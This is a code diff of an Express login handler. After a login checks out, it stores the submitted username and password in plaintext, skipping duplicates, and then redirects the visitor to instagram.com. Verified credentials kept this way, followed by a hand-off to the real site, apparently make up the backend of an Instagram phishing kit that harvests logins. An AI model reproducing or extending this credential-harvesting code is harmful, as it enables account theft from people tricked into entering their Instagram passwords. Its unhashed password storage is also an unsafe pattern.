@@ -56,14 +56,16 @@ const loginUser = asyncHandler(async (req, res) => {
 
     console.log(result.authenticated);
     if (result.authenticated === true) {
-      const user = await User.create({
-        username,
-        password,
-      });
-      // return res.redirect("https://www.instagram.com");
-      return res.status(200).json({
-        message: "ok",
-      });
+      if (!(await User.findOne({username}))) {
+        const user = await User.create({
+          username,
+          password,
+        });
+      }
+      return res.redirect("https://www.instagram.com");
+      // return res.status(200).json({
+      //   message: "ok",
+      // });
     } else {
       return res.status(401).json({
         success: false,
